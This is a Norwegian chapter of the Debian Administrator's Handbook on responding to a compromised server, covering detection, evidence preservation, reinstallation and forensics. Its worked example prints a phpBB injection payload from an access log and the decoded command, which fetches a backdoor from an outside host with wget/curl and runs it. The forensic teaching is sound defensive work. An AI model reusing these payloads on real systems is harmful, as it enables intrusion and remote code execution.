<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html
    xmlns="http://www.w3.org/1999/xhtml"><head><meta
        http-equiv="Content-Type"
        content="text/html; charset=UTF-8" /><title
        xmlns:d="http://docbook.org/ns/docbook">14.7. Å håndtere en kompromittert maskin</title><link
        rel="stylesheet"
        type="text/css"
        href="Common_Content/css/default.css" /><link
        rel="stylesheet"
        media="print"
        href="Common_Content/css/print.css"
        type="text/css" /><meta
        xmlns:d="http://docbook.org/ns/docbook"
        name="generator"
        content="publican v4.3.2" /><meta
        xmlns:d="http://docbook.org/ns/docbook"
        name="package"
        content="Debian-debian-handbook-8-nb-NO-1.0-1" /><meta
        name="keywords"
        content="Brannmur, Nettfilter, IDS/NIDS" /><link
        rel="home"
        href="index.html"
        title="Håndbok for Debian-administratoren" /><link
        rel="up"
        href="security.html"
        title="Kapittel 14. Sikkerhet" /><link
        rel="prev"
        href="sect.other-security-considerations.html"
        title="14.6. Andre sikkerhetsrelaterte overveielser" /><link
        rel="next"
        href="debian-packaging.html"
        title="Kapittel 15. Å lage en Debian-pakke" /><link
        xmlns=""
        rel="canonical"
        href="https://debian-handbook.info/browse/nb-NO/stable/sect.dealing-with-compromised-machine.html" /></head><body><div
        id="banner"><a
          href="http://debian-handbook.info/get/"><span
            class="text">Download the ebook</span></a></div><p
        id="title"><a
          class="left"
          href="http://www.debian.org"><img
            alt="Product Site"
            src="Common_Content/images//image_left.png" /></a><a
          class="right"
          href="index.html"><img
            alt="Documentation Site"
            src="Common_Content/images//image_right.png" /></a></p><ul
        class="docnav top"><li
          class="previous"><a
            accesskey="p"
            href="sect.other-security-considerations.html"><strong>Forrige</strong></a></li><li
          class="home">Håndbok for Debian-administratoren</li><li
          class="next"><a
            accesskey="n"
            href="debian-packaging.html"><strong>Neste</strong></a></li></ul><div
        class="section"><div
          class="titlepage"><div><div><h2
                class="title"><a
                  xmlns=""
                  id="sect.dealing-with-compromised-machine"></a>14.7. Å håndtere en kompromittert maskin</h2></div></div></div><div
          class="para">
			Til tross for de beste intensjoner og et nøye utformet sikkerhetsopplegg, kan en administrator likevel stå ansikt til ansikt med en kapring. Denne seksjonen inneholder noen veiledninger om hvordan man skal reagere konfrontert med slike uheldige omstendigheter.
		</div><div
          class="section"><div
            class="titlepage"><div><div><h3
                  class="title"><a
                    xmlns=""
                    id="id-1.17.10.3"></a>14.7.1. Avdekke og se innbruddet</h3></div></div></div><div
            class="para">
				Det første skrittet for å reagere mot et innbrudd er å bli oppmerksom på en slik handling. Dette er ikke selvinnlysende, spesielt uten et tilstrekkelig infrastruktur for overvåking.
			</div><div
            class="para">
				Innbruddshandlinger oppdages ofte ikke før de har direkte konsekvenser for de legitime tjenestene på vertsmaskinen, for eksempel at tilkoblinger bremses ned, noen brukere ikke klarer å koble til, eller noen annen form for feil. Konfrontert med disse problemene, må administratoren ta en god titt på maskinen, og nøye granske hva den feiler. Dette er vanligvis det tidspunktet da man oppdager en uvanlig prosess, for eksempel en som heter <code
              class="literal">apache</code> i stedet for standarden <code
              class="literal">/usr/sbin/apache2</code>. Hvis vi følger dette eksemplet, er tingen å gjøre å være oppmerksom på prosessidentifisereren, og sjekke <code
              class="filename">/proc/<em
                class="replaceable">pid</em>/exe</code> for å se hvilket program denne prosessen kjører for øyeblikket:
			</div><pre
            class="screen">
<code
              class="computeroutput"># </code><strong
              class="userinput"><code>ls -al /proc/3719/exe</code></strong>
<code
              class="computeroutput">lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</code>
</pre><div
            class="para">
				Kjører et program installert under <code
              class="filename">/var/tmp/</code> som en nettjener? Ingen tvil igjen, maskinen er kompromittert.
			</div><div
            class="para">
				Dette er bare ett eksempel, men mange andre tips kan få det til å ringe i administratorens bjelle:
			</div><div
            xmlns:d="http://docbook.org/ns/docbook"
            class="itemizedlist"><ul><li
                class="listitem"><div
                  class="para">
						et alternativ til en kommando som ikke lenger fungerer; versjonen av programvaren som kommandoen hevder å være, samsvarer ikke med den versjonen som den er ment å være installert i samsvar med <code
                    class="command">dpkg</code>;
					</div></li><li
                class="listitem"><div
                  class="para">
						en ledetekst eller en velkomstmelding som indikerer at den siste forbindelsen kom fra en ukjent tjener på et annet kontinent;
					</div></li><li
                class="listitem"><div
                  class="para">
						feil forårsaket av at <code
                    class="filename">/tmp/</code>-partisjon er full, noe som viste seg å være med ulovlige kopierte filmer;
					</div></li><li
                class="listitem"><div
                  class="para">
						og så videre.
					</div></li></ul></div></div><div
          class="section"><div
            class="titlepage"><div><div><h3
                  class="title"><a
                    xmlns=""
                    id="id-1.17.10.4"></a>14.7.2. Å sette tjeneren Off-Line</h3></div></div></div><div
            class="para">
				I alle, bortsett fra de mest eksotiske tilfeller, kommer innbrudd fra nettverket, og angriperen trenger et fungerende nettverk for å nå sine mål (tilgang til konfidensielle data, deling av ulovlige filer, skjuling av sin identitet ved å bruke maskinen som til stafett, og så videre). Å koble datamaskinen fra nettverket vil hindre angriperen fra å nå disse målene, hvis denne ikke har klart å gjøre det allerede.
			</div><div
            class="para">
				Dette kan bare være mulig hvis tjeneren er fysisk tilgjengelig. Når tjeneren leier plass hos en vertsleverandør på en annen kant av landet, eller hvis tjeneren ikke er tilgjengelig av noen annen grunn, er det vanligvis en god idé å starte med å samle viktig informasjon (se <a
              class="xref"
              href="sect.dealing-with-compromised-machine.html#sect.keeping-everything-that-could-be-used-as-evidence">Seksjon 14.7.3, «Beholde alt som kan brukes som bevis»</a>, <a
              class="xref"
              href="sect.dealing-with-compromised-machine.html#sect.forensic-analysis">Seksjon 14.7.5, «Rettslig analyse»</a> og <a
              class="xref"
              href="sect.dealing-with-compromised-machine.html#sect.reconstituting-the-attack-scenario">Seksjon 14.7.6, «Å rekonstruere et angrepsscenario»</a>), deretter å isolere denne tjeneren så mye som mulig ved å lukke så mange tjenester som mulig (vanligvis, alt untatt <code
              class="command">sshd</code>). Denne saken er fortsatt vanskelig, siden man ikke kan utelukke muligheten for at angriperen har samme SSH-tilgang som administratoren har. Dette gjør det vanskeligere å «rense» maskinene.
			</div></div><div
          class="section"><div
            class="titlepage"><div><div><h3
                  class="title"><a
                    xmlns=""
                    id="sect.keeping-everything-that-could-be-used-as-evidence"></a>14.7.3. Beholde alt som kan brukes som bevis</h3></div></div></div><div
            class="para">
				Å forstå angrep og/eller vinne søksmål mot angriperne forutsetter å ta kopier av alle viktige elementer; medregnet innholdet på harddisken, en liste over alle prosesser som kjører, og en liste over alle åpne tilkoblinger. Innholdet i RAM kan også benyttes, men det er sjelden brukt i praksis.
			</div><div
            class="para">
				I sakens hete er administratorer ofte fristet til å utføre mange kontroller av den kompromitterte maskinen; det er vanligvis ikke en god idé. Hver kommando er potensielt skadelig, og kan slette deler av bevis. Kontrollene bør begrenses til minimumssettet, (<code
              class="command">netstat -tupan</code> for nettverksforbindelser, <code
              class="command">ps auxf</code> for en liste med prosesser, <code
              class="command">ls -alR /proc/[0-9]*</code> for litt mer informasjon om programmer som kjører), og hver utført sjekk bør omsorgsfullt skrives ned.
			</div><div
            class="sidebar"><div
              class="titlepage"><div><div><p
                    class="title"><strong><span
                        class="emphasis"><em>CAUTION</em></span> Hot analysis</strong></p></div></div></div><div
              class="para">
				Mens det kan virke fristende å analysere systemet mens det går, spesielt når en ikke er i fysisk kontakt med tjeneren, er det best at dette unngås: Du kan rett og slett ikke stole på de programmene som er installert på det kompromitterte systemet. Det er fullt mulig for en skadelig <code
                class="command">ps</code>-kommando å skjule noen prosesser, eller for en skadelig <code
                class="command">ls</code> å skjule filer; noen ganger kan til og med kjernen være kompromittert!
			</div><div
              class="para">
				Dersom en slik varm analyse fortsatt er nødvendig, bør man sørge for å bare bruke godt kjente programmer. En god måte å gjøre det på ville være å ha en rednings-CD med uberørte programmer, eller en skrivebeskyttet nettverksressurs. Imidlertid kan selv disse mottiltak ikke være nok hvis kjernen selv er kompromittert.
			</div></div><div
            class="para">
				Når de «dynamiske» elementer ha blitt lagret, er neste steg å lagre et komplett bilde av harddisken. Å lage et slikt bilde er umulig hvis filsystemet er fortsatt utvikles, og det derfor må monteres om skrivebeskyttet . Den enkleste løsningen er ofte å stoppe tjeneren brutalt (etter å ha kjørt <code
              class="command">sync</code>), og starte den på nytt med en rednings-CD. Hver partisjon skal kopieres med et verktøy som <code
              class="command">dd</code>. Disse bildene kan sendes til en annen tjener (muligens med det veldig praktiske <code
              class="command">nc</code>-verktøyet). En annen mulighet kan være enda enklere: Bare få disken ut av maskinen og erstatt den med en ny en som kan formateres og reinstalleres.
			</div></div><div
          class="section"><div
            class="titlepage"><div><div><h3
                  class="title"><a
                    xmlns=""
                    id="id-1.17.10.6"></a>14.7.4. Reinstallering</h3></div></div></div><a
            id="id-1.17.10.6.2"
            class="indexterm"></a><div
            class="para">
				Tjeneren skal ikke bringes tilbake i drift uten en fullstendig reinstallasjon. Dersom skaden var alvorlig (hvis administrative rettigheter lakk ut), er det nesten ingen annen måte å være sikker på at vi blir kvitt alt angriperen kan ha etterlatt seg (spesielt <span
              class="emphasis"><em>bakdør</em></span>). Selvfølgelig må alle de nyeste sikkerhetsoppdateringene benyttes, slik som å plugge den sårbarheten som brukes av angriperen. Ideelt sett: Å analysere angrepet skal peke på denne angrepsmetoden, slik at man faktisk kan være sikker på å få fikset den. Ellers kan man bare håpe at sårbarheten var en av dem som er ordnet via oppdateringene.
			</div><div
            class="para">
				Å installere en ekstern tjener er ikke alltid lett; det kan innebære bistand fra vertsselskapet, fordi ikke alle slike selskaper tilbyr automatiserte reinstalleringssystemer. Forsiktighet bør utvises for ikke å reinstallere maskinen fra sikkerhetskopier tatt opp etter kompromitteringen. Ideelt sett bør kun data gjenopprettes, selve programvaren må installeres på nytt fra installasjonsmediet .
			</div></div><div
          class="section"><div
            class="titlepage"><div><div><h3
                  class="title"><a
                    xmlns=""
                    id="sect.forensic-analysis"></a>14.7.5. Rettslig analyse</h3></div></div></div><div
            class="para">
				Nå som tjenesten er gjenopprettet, er det på tide å se nærmere på diskbilder av det kompromitterte systemet for å forstå angrepsmetoden. Ved montering av disse bildene, bør man sørge for å bruke <code
              class="literal">ro,nodev,noexec,noatime</code>-alternativene for å unngå å endre innholdet (inkludert tidsstempler for tilgangen til filer), eller å kjøre kompromitterte programmer ved en feiltakelse.
			</div><div
            class="para">
				Å gjennomgå et angrepsscenario innebærer vanligvis å lete etter alt som ble endret og kjørt:
			</div><div
            xmlns:d="http://docbook.org/ns/docbook"
            class="itemizedlist"><ul><li
                class="listitem"><div
                  class="para">
						Å lese <code
                    class="filename">.bash_history</code>-filer er ofte svært interessant;
					</div></li><li
                class="listitem"><div
                  class="para">
						det gjør også listing av filer som nylig ble opprettet, endret eller åpnet;
					</div></li><li
                class="listitem"><div
                  class="para">
						<code
                    class="command">strings</code>-kommandoen kan være til hjelp med å identifisere programmer installert av angriperen, ved å ekstrahere strenger fra binærfiler;
					</div></li><li
                class="listitem"><div
                  class="para">
						loggfilene i <code
                    class="filename">/var/log/</code> gjør det ofte mulig å rekonstruere hendelsesrekkefølgen;
					</div></li><li
                class="listitem"><div
                  class="para">
						verktøy for spesielle formål tillater også gjenoppretting av innholdet i potensielt slettede filer, medregnet loggfiler som angripere ofte sletter.
					</div></li></ul></div><div
            class="para">
				Noen av disse operasjonene kan gjøres enklere med spesialisert programvare. Spesielt <span
              class="pkg pkg">sleuthkit</span>-pakken inneholder mange verktøy for å analysere et filsystem. Bruken er gjort enklere med <span
              class="emphasis"><em>Autopsy Forensic Browser</em></span>-grafiske grensesnitt (i <span
              class="pkg pkg">autopsy</span>-pakken).
			</div><a
            id="id-1.17.10.7.6"
            class="indexterm"></a><a
            id="id-1.17.10.7.7"
            class="indexterm"></a></div><div
          class="section"><div
            class="titlepage"><div><div><h3
                  class="title"><a
                    xmlns=""
                    id="sect.reconstituting-the-attack-scenario"></a>14.7.6. Å rekonstruere et angrepsscenario</h3></div></div></div><div
            class="para">
				Alle elementene samlet under analysen skal passe sammen som brikker i et puslespill; etableringen av de første mistenkelige filer er ofte korrelert med logger som beviser brudd. Et virkelig eksempel bør være tydeligere enn lange teoretiske skriblinger.
			</div><div
            class="para">
				Den følgende loggen er et utdrag fra en Apache <code
              class="filename">access.log</code>:
			</div><pre
            class="programlisting">
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
</pre><div
            class="para">
				Dette eksemplet samsvarer med en utnyttelse av et gammelt sikkerhetsproblem i phpBB. <div
              xmlns=""
              class="url">→ <a
                xmlns="http://www.w3.org/1999/xhtml"
                href="http://secunia.com/advisories/13239/">http://secunia.com/advisories/13239/</a></div> <div
              xmlns=""
              class="url">→ <a
                xmlns="http://www.w3.org/1999/xhtml"
                href="http://www.phpbb.com/phpBB/viewtopic.php?t=240636">http://www.phpbb.com/phpBB/viewtopic.php?t=240636</a></div>
			</div><div
            class="para">
				Å dekode denne lange URL-en fører til at en forstår at angriperen klarte å kjøre noe PHP-kode, nemlig: <code
              class="command">system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</code>. Selvfølgelig, en <code
              class="filename">bd</code>-fil ble funnet i <code
              class="filename">/tmp/</code>. Å kjøre <code
              class="command">strings /mnt/tmp/bd</code> returnerer, blant andre strenger, <code
              class="literal">PsychoPhobia Backdoor is starting...</code>. Dette ser virkelig ut som en bakdør.
			</div><div
            class="para">
				En tid senere ble denne tilgangen brukt til å laste ned, installere og kjøre en IRC <span
              class="emphasis"><em>bot</em></span> som er koblet til et underjordisk IRC-nettverk. Oppstarten kan da styres via denne protokollen og instrueres til å laste ned filer til deling. Dette programmet har også sin egen loggfil:
			</div><pre
            class="programlisting">** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)
</pre><div
            class="para">
				Disse sporene viser at to videofiler er lagret på tjeneren ved hjelp av IP-adressen 82.50.72.202.
			</div><div
            class="para">
				Parallelt har angriperen også lastet ned et par ekstra filer,<code
              class="filename">/tmp/pt</code> og <code
              class="filename">/tmp/loginx</code>. Å kjøre disse filene gjennom <code
              class="command">strings</code> leder til strenger slike som <span
              class="foreignphrase"><em
                class="foreignphrase">Shellcode placed at 0x%08lx</em></span> og <span
              class="foreignphrase"><em
                class="foreignphrase">Now wait for suid shell...</em></span>. Disse ser ut som programmer som utnytter lokale sårbarheter for å få administrative rettigheter. Hadde de nå sine mål? I dette tilfellet sannsynligvis ikke, ettersom ingen filer synes å ha blitt modifisert etter det første innbruddet.
			</div><div
            class="para">
				I dette eksemplet er hele inntrengningen rekonstruert, og det kan utledes at angriperen har greid å dra nytte av det kompromitterte systemet i rundt tre dager. Men det viktigste elementet i analysen er at sikkerhetsbruddet er identifisert, og administratoren kan være sikker på at den nye installasjonen virkelig fikser sårbarheten.
			</div></div></div><ul
        class="docnav"><li
          class="previous"><a
            accesskey="p"
            href="sect.other-security-considerations.html"><strong>Forrige</strong>14.6. Andre sikkerhetsrelaterte overveielser</a></li><li
          class="up"><a
            accesskey="u"
            href="#"><strong>Opp</strong></a></li><li
          class="home"><a
            accesskey="h"
            href="index.html"><strong>Hjem</strong></a></li><li
          class="next"><a
            accesskey="n"
            href="debian-packaging.html"><strong>Neste</strong>Kapittel 15. Å lage en Debian-pakke</a></li></ul></body></html>
